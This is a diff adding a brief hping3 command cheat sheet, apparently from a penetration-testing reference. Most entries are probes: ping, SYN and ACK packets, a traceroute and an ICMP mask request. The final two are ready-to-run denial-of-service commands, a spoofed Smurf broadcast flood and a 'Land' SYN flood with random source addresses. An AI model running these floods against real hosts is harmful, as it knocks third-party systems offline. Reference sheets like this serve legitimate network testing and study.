@@ -1,0 +1,15 @@
+# ICMP 
+hping3 -1 -c 1 192.168.1.12
+# Send the SYN PACKET
+hping3 -S -c 1 -s 5151 -p 80 192.168.1.12
+# Send the ACK PACKET
+hping3 -A -c 1 -s 5151 -p 80 192.168.1.12
+#Traceroute using hping3
+hping3 --traceroute -V -S -p 80 -s 5050 0daysecurity.com
+# ICMP address mask request
+hping3 -c 1 -V -1 -C 17 0daysecurity.com
+# Smurf Attack:
+hping3 -1 --flood -a VICTIM_IP BROADCAST_ADDRESS
+
+#DOS Land attack
+hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source VICTIM_IP
